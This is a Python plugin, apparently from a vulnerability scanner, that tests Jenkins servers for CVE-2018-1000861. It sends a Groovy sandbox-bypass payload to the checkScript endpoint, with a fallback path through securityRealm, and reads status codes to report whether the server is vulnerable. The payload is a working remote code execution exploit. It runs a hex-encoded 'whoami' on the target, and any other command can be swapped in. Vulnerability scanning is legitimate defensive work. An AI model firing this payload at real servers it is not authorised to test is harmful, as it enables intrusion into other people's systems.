#!/usr/bin/env python3
# -*- coding:utf-8 -*-
# @Date    : 2021/06/24
# @Author  : 5wimming

import requests

readme = {'strategy_name': 'Jenkins rce CVE-2018-1000861', 'service_name': 'http',
          'port': '8080', 'application': 'jenkins', 'proto': 'tcp', 'version': '',
          'remarks': '', 'cpe': '', 'vendor': '', 'base_score': '9'}

endpoint = 'descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript'


def jenkins_rce(url):
    payload = 'public class x{public x(){new String("%s".decodeHex()).execute()}}' % b'whoami'.hex()
    params = {
        'sandbox': True,
        'value': payload
    }

    r = requests.get(url, verify=False, timeout=10)
    flag = False
    if r.status_code == 200 and 'adjuncts' in r.text:
        flag = True
        rc = requests.get(url + endpoint, params=params, verify=False, timeout=10)
    elif r.status_code == 403:
        flag = True
        rc = requests.get(url + 'securityRealm/user/admin/' + endpoint, params=params, verify=False, timeout=10)

    if flag:
        if rc.status_code == 200:
            return 'Jenkins rce CVE-2018-1000861'
        elif rc.status_code == 405:
            return 'May be Jenkins has patched the RCE gadget'

    return None


def main(target_info, *args):
    try:
        url = target_info.get('url', '')
        if url:
            return jenkins_rce(url)
    except Exception as e:
        print(e)
        pass

    return None


if __name__ == '__main__':
    target = {'ip': '192.168.31.8', 'port': '6024', 'service': 'http',
              'application': 'jenkins', 'url': 'http://192.168.31.8:6024/'}
    print(main(target))
